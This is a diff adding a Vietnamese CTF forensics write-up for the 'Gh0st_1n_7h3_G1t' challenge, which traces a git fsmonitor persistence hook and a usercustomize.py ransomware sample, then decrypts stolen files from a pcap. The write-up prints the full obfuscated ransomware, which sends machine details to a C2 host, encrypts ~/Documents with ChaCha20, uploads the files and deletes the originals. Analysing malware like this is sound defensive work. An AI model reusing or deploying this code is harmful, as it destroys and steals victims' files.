@@ -2,7 +2,7 @@
 title: "Midnight Flag CTF 2026"
 date: 2026-03-16 03:00:00 +0700
 categories: [CTF, Midnight Flag CTF]
-tags: [Threat Hunting, Log analysis]
+tags: [Threat Hunting, Log analysis, CVE-2024-9264, CVE-2025-33073]
 image: /assets/images10/banner.png
 toc: true
 layout: post
@@ -80,6 +80,7 @@ Tiến hành trace ngược lại các dòng log được thực thi lệnh xoay
 
 # POST-MORTEM ARTIFACTS SERIES
 
+#### Không có thói quen lưu lại timeline của quá trình phân tích log nên giờ mấy ảnh chụp khá nhập nhằng và cái cần thì lại quên kh chụp nên đợi BTC mở lại server đã :))
 #### Có tổng 3 challenge, solve được 1 challenge thì mới mở challenge tiếp theo
 
 ## POST-MORTEM ARTIFACTS (1/3)
@@ -138,6 +139,269 @@ Example: MCTF{some-feature_SERVER-01_25:47}
 
 ## Gh0st_1n_7h3_G1t
 
+### Description
+
 ### Solution
 
-`Flag: MCTF{Th1S_Is_Y0uR_f7rst_P@rt0x_F1n@l_P4rt$}`
+Bài cung cấp cho 1 máy ảo file `.ova`, mở bằng `Virtualbox` rồi tiến hành phân tích
+
+Thử thách yêu cầu điều tra một hệ thống Linux bị xâm nhập qua 2 file gồm file chứa hdh Ubuntu `.ova` và file pcap chứa data bị đánh cắp
+
+Quá trình bắt đầu bằng file `note.txt` chứa kết quả quét từ công cụ Nikto, thấy được hệ thống đang để lộ thư mục quản lý phiên bản `.git` công khai 
+![image](assets/images10/10.png)
+
+Dựa trên thông tin từ Nikto, tiến hành kiểm tra thư mục dự án bug-git. Thấy được sự hiện diện của: app.py, static/, và templates/ xác nhận đây là ứng dụng web chạy trên nền tảng Flask. Thực hiện kiểm tra vào cấu hình nội bộ tại `.git/config`. Phát hiện được một cơ chế Persistence thông qua tùy chọn `fsmonitor`
+
+![image](assets/images10/9.png)
+
+Mã độc lợi dụng tính năng theo dõi tệp tin của Git để thực thi mã độc với quyền cao. Chuỗi ký tự cuối cùng là định dạng Base64 giải mã ta nhận được Part 1 của flag
+
+`part 1: Th1S_Is_Y0uR_f7rst_P@rt`
+
+Tiếp theo ta có nhận được 1 thông báo lỗi hệ thống xuất hiện trên màn hình người dùng. Thông báo chỉ ra một sự cố nghiêm trọng trong quá trình xử lý gói tin của hệ thống
+
+![image](assets/images10/11.png)
+
+Lỗi này xác nhận sự tồn tại của tệp `usercustomize.py`. Trong python, đây là một module đặc biệt được trình thông dịch tự động tìm kiếm và thực thi đầu tiên mỗi khi khởi động. Xác định vị trí file thấy xuất hiện trong `/usr/lib/python3.12/`, cho thấy mã độc đã chiếm được quyền `Root` để ghi đè lên các tệp cấu hình của hệ thống
+
+![image](assets/images10/12.png)
+
+Nội dung tệp `usercustomize.py` tiết lộ một kịch bản tấn công Ransomware sử dụng thuật toán `ChaCha20` để encrypt dữ liệu
+
+```python
+import os
+import ssl
+import json
+import socket
+import struct
+import hashlib
+import urllib.request
+import base64
+
+
+_0xfb8c4d = __import__(base64.b64decode(b"cGxhdGZvcm0=").decode())
+_0x3e9a7f = __import__(base64.b64decode(b"Z2V0cGFzcw==").decode())
+
+_0x4a2b8f = base64.b64decode(b"MTkyLjE2OC4xLjY0").decode()
+
+_0x7d3c9a = ssl.create_default_context()
+_0x7d3c9a.check_hostname = False
+_0x7d3c9a.verify_mode    = ssl.CERT_NONE
+
+def _0x9f4e2a(v, n):
+    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF
+
+def _0x6b1d7c(a, b, c, d):
+    a = (a + b) & 0xFFFFFFFF; d ^= a; d = _0x9f4e2a(d, 16)
+    c = (c + d) & 0xFFFFFFFF; b ^= c; b = _0x9f4e2a(b, 12)
+    a = (a + b) & 0xFFFFFFFF; d ^= a; d = _0x9f4e2a(d, 8)
+    c = (c + d) & 0xFFFFFFFF; b ^= c; b = _0x9f4e2a(b, 7)
+    return a, b, c, d
+
+def _0x3c8f5b(key: bytes, counter: int, nonce: bytes) -> bytes:
+    _0x1a4e9f = base64.b64decode(b"ZXhwYW5kIDMyLWJ5dGUgaw==")
+    state = list(struct.unpack(base64.b64decode(b"PDE2SQ==").decode(),
+        _0x1a4e9f +
+        key[:32] +
+        struct.pack(base64.b64decode(b"PEk=").decode(), counter & 0xFFFFFFFF) +
+        nonce[:12]
+    ))
+
+    working = state[:]
+    for _ in range(10):
+        working[0],  working[4],  working[8],  working[12] = _0x6b1d7c(working[0],  working[4],  working[8],  working[12])
+        working[1],  working[5],  working[9],  working[13] = _0x6b1d7c(working[1],  working[5],  working[9],  working[13])
+        working[2],  working[6],  working[10], working[14] = _0x6b1d7c(working[2],  working[6],  working[10], working[14])
+        working[3],  working[7],  working[11], working[15] = _0x6b1d7c(working[3],  working[7],  working[11], working[15])
+        working[0],  working[5],  working[10], working[15] = _0x6b1d7c(working[0],  working[5],  working[10], working[15])
+        working[1],  working[6],  working[11], working[12] = _0x6b1d7c(working[1],  working[6],  working[11], working[12])
+        working[2],  working[7],  working[8],  working[13] = _0x6b1d7c(working[2],  working[7],  working[8],  working[13])
+        working[3],  working[4],  working[9],  working[14] = _0x6b1d7c(working[3],  working[4],  working[9],  working[14])
+
+    output = [(working[i] + state[i]) & 0xFFFFFFFF for i in range(16)]
+    return struct.pack(base64.b64decode(b"PDE2SQ==").decode(), *output)
+
+def _0x8e2a6d(plaintext: bytes, key: bytes, nonce: bytes, counter: int = 0) -> bytes:
+    ciphertext = bytearray()
+    for i in range(0, len(plaintext), 64):
+        block    = _0x3c8f5b(key, counter + i // 64, nonce)
+        chunk    = plaintext[i:i + 64]
+        ciphertext += bytes(a ^ b for a, b in zip(chunk, block))
+    return bytes(ciphertext)
+
+
+_0x2f7b4a = getattr(_0xfb8c4d, base64.b64decode(b"bm9kZQ==").decode())()
+_0x9c3e1d = getattr(_0xfb8c4d, base64.b64decode(b"cmVsZWFzZQ==").decode())()
+_0x5a6f8b = getattr(_0x3e9a7f, base64.b64decode(b"Z2V0dXNlcg==").decode())()
+
+try:
+    with open(base64.b64decode(b"L2V0Yy9tYWNoaW5lLWlk").decode(), base64.b64decode(b"cg==").decode()) as f:
+        _0x4d8c2e = f.read().strip()
+except FileNotFoundError:
+    _0x4d8c2e = base64.b64decode(b"dW5rbm93bg==").decode()
+
+
+def _0x7f9d3a():
+    _0x1f45e0 = {
+        base64.b64decode(b"aG9zdG5hbWU=").decode(): _0x2f7b4a,
+        base64.b64decode(b"a2VybmVs").decode():   _0x9c3e1d,
+        base64.b64decode(b"dXNlcm5hbWU=").decode(): _0x5a6f8b,
+        base64.b64decode(b"bWFjaGluZV9pZA==").decode(): _0x4d8c2e,
+    }
+
+    _0x6e4a2f = base64.b64decode(b"aHR0cHM6Ly8=").decode() + _0x4a2b8f + base64.b64decode(b"Ojg0NDM=").decode()
+
+    body = json.dumps(_0x1f45e0).encode()
+    req  = urllib.request.Request(
+        _0x6e4a2f + base64.b64decode(b"L2pzb24=").decode(),
+        data=body,
+        headers={base64.b64decode(b"Q29udGVudC1UeXBl").decode(): base64.b64decode(b"YXBwbGljYXRpb24vanNvbg==").decode()},
+        method=base64.b64decode(b"UE9TVA==").decode(),
+    )
+    with urllib.request.urlopen(req, context=_0x7d3c9a) as resp:
+        resp.read()
+
+
+def _0x1b5e9c() -> tuple[bytes, bytes]:
+    seed   = f"{_0x2f7b4a}:{_0x9c3e1d}:{_0x4d8c2e}:{_0x5a6f8b}"
+    digest = hashlib.sha512(seed.encode()).digest()
+    key    = digest[:32]
+    nonce  = digest[32:44]
+    return key, nonce
+
+
+def _0x3a7f2d(filename: str, data: bytes):
+    _0x9b4e6c = 9000
+
+    name_bytes = filename.encode(base64.b64decode(b"dXRmLTg=").decode())
+    with socket.create_connection((_0x4a2b8f, _0x9b4e6c)) as sock:
+        sock.sendall(struct.pack(base64.b64decode(b"Pkk=").decode(), len(name_bytes)))
+        sock.sendall(name_bytes)
+        sock.sendall(struct.pack(base64.b64decode(b"Pkk=").decode(), len(data)))
+        sock.sendall(data)
+        sock.recv(3)
+
+
+_0x8c1d4f   = os.path.join(os.path.expanduser(base64.b64decode(b"fg==").decode()), base64.b64decode(b"RG9jdW1lbnRz").decode())
+key, nonce = _0x1b5e9c()
+
+_0x7f9d3a()
+
+for fname in os.listdir(_0x8c1d4f):
+    fpath = os.path.join(_0x8c1d4f, fname)
+    if not os.path.isfile(fpath):
+        continue
+
+    with open(fpath, base64.b64decode(b"cmI=").decode()) as f:
+        plaintext = f.read()
+
+    ciphertext = _0x8e2a6d(plaintext, key, nonce)
+    _0x3a7f2d(fname + base64.b64decode(b"LmhlbGxjYXQ=").decode(), ciphertext)
+    os.remove(fpath)
+
+```
+
+- Seed đầu vào: Kết hợp các thông tin hostname, kernel version, machine-id và username.
+
+- Tạo khóa: Sử dụng hàm băm SHA-512 từ chuỗi Seed trên để lấy 32 byte đầu làm Key và 12 byte tiếp theo làm Nonce.
+
+- Quét mục tiêu: Tìm kiếm tất cả tệp tin trong thư mục ~/Documents.
+
+- Mã hóa: Thực hiện mã hóa nội dung tệp bằng khóa đã tạo.
+
+- Gửi thông tin định danh máy về máy chủ kẻ tấn công (C2 Server) tại IP 192.168.1.64 qua cổng 8443 dưới dạng JSON và truyền tải tệp tin đã mã hóa có đuôi `.hellcat` về cổng 9000 của máy chủ này
+
+- Sử dụng lệnh os.remove(fpath) để xóa sạch tệp tin gốc trên máy nạn nhân, khiến việc khôi phục bằng các công cụ phục hồi ổ đĩa trở nên khó khăn
+
+Vì ta đang phân tích trực tiếp trên máy mục tiêu nên có thể lấy được thông tin tạo Seed trực tiếp từ đây 
+
+![image](assets/images10/13.png)
+
+Tiếp theo tiến hành trích xuất tệp tin bị mã hóa và gửi đi qua pcap, filter theo `tcp.port == 9000` và
+
+![image](assets/images10/14.png)
+
+Cuối cùng, thực hiện thuật toán ChaCha20 bằng script Python với các thông số đã trích xuất. Vì đây là thuật toán mã hóa dòng Stream Cipher, việc áp dụng cùng một luồng khóa Keystream vào Ciphertext sẽ khôi phục được file PDF ban đầu
+
+```python
+import hashlib
+import struct
+import os
+
+HOSTNAME   = "midnight"
+KERNEL     = "6.17.0-14-generic"
+MACHINE_ID = "6ea3ad95b0cb495d86291db1c798247f"
+USERNAME   = "john"
+
+def rotate_left(v, n):
+    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF
+
+def quarter_round(a, b, c, d):
+    a = (a + b) & 0xFFFFFFFF; d ^= a; d = rotate_left(d, 16)
+    c = (c + d) & 0xFFFFFFFF; b ^= c; b = rotate_left(b, 12)
+    a = (a + b) & 0xFFFFFFFF; d ^= a; d = rotate_left(d, 8)
+    c = (c + d) & 0xFFFFFFFF; b ^= c; b = rotate_left(b, 7)
+    return a, b, c, d
+
+def chacha20_block(key, counter, nonce):
+    constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]
+    state = constants + list(struct.unpack("<8I", key)) + [counter & 0xFFFFFFFF] + list(struct.unpack("<3I", nonce))
+    working = state[:]
+    for _ in range(10):
+        working[0], working[4], working[8],  working[12] = quarter_round(working[0], working[4], working[8],  working[12])
+        working[1], working[5], working[9],  working[13] = quarter_round(working[1], working[5], working[9],  working[13])
+        working[2], working[6], working[10], working[14] = quarter_round(working[2], working[6], working[10], working[14])
+        working[3], working[7], working[11], working[15] = quarter_round(working[3], working[7], working[11], working[15])
+        working[0], working[5], working[10], working[15] = quarter_round(working[0], working[5], working[10], working[15])
+        working[1], working[6], working[11], working[12] = quarter_round(working[1], working[6], working[11], working[12])
+        working[2], working[7], working[8],  working[13] = quarter_round(working[2], working[7], working[8],  working[13])
+        working[3], working[4], working[9],  working[14] = quarter_round(working[3], working[4], working[9],  working[14])
+    return struct.pack("<16I", *[(working[i] + state[i]) & 0xFFFFFFFF for i in range(16)])
+
+def decrypt_chacha20(ciphertext, key, nonce):
+    plaintext = bytearray()
+    for i in range(0, len(ciphertext), 64):
+        block = chacha20_block(key, i // 64, nonce)
+        chunk = ciphertext[i:i + 64]
+        plaintext += bytes(a ^ b for a, b in zip(chunk, block))
+    return bytes(plaintext)
+
+def main():
+    seed = f"{HOSTNAME}:{KERNEL}:{MACHINE_ID}:{USERNAME}"
+    digest = hashlib.sha512(seed.encode()).digest()
+    key = digest[:32]
+    nonce = digest[32:44]
+
+    if not os.path.exists("ok"):
+        print("File not found.")
+        return
+
+    with open("ok", "rb") as f:
+        data = f.read()
+
+    # Try every offset in the first 256 bytes to find %PDF header
+    found = False
+    for offset in range(min(256, len(data))):
+        test_decrypted = decrypt_chacha20(data[offset:offset+64], key, nonce)
+        if b"%PDF" in test_decrypted:
+            print(f"Found PDF header at offset {offset}!")
+            full_decrypted = decrypt_chacha20(data[offset:], key, nonce)
+            with open("recovered.pdf", "wb") as f:
+                f.write(full_decrypted)
+            found = True
+            break
+    
+    if not found:
+        # Fallback: decrypt from offset 0
+        print("No PDF header found. Decrypting from offset 0...")
+        full_decrypted = decrypt_chacha20(data, key, nonce)
+        with open("recovered.pdf", "wb") as f:
+            f.write(full_decrypted)
+
+if __name__ == "__main__":
+    main()
+```
+
+![image](assets/images10/15.png)
+
+`Flag: MCTF{Th1S_Is_YðuR_f7rst_P@rt0x_F1n@l_P4rt$}`
